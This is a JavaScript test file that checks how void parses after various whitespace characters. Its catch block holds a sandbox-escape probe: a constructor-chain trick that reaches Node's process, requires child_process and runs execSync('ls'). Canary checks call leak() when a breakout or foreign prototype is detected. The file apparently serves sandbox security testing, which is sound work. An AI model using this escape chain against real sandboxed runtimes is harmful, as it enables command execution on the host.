try {
    if (eval('void\t0') !== undefined) {
        $ERROR('#1: void\\u00090 === undefined');
    }
    if (eval('void\x0B0') !== undefined) {
        $ERROR('#2: void\\u000B0 === undefined');
    }
    if (eval('void\f0') !== undefined) {
        $ERROR('#3: void\\u000C0 === undefined');
    }
    if (eval('void 0') !== undefined) {
        $ERROR('#4: void\\u00200 === undefined');
    }
    if (eval('void\xA00') !== undefined) {
        $ERROR('#5: void\\u00A00 === undefined');
    }
    if (eval('void\n0') !== undefined) {
        $ERROR('#6: void\\u000A0 === undefined');
    }
    if (eval('void\r0') !== undefined) {
        $ERROR('#7: void\\u000D0 === undefined');
    }
    if (eval('void\u20280') !== undefined) {
        $ERROR('#8: void\\u20280 === undefined');
    }
    if (eval('void\u20290') !== undefined) {
        $ERROR('#9: void\\u20290 === undefined');
    }
    if (eval('void\t\x0B\f \xA0\n\r\u2028\u20290') !== undefined) {
        $ERROR('#10: void\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u20290 === undefined');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}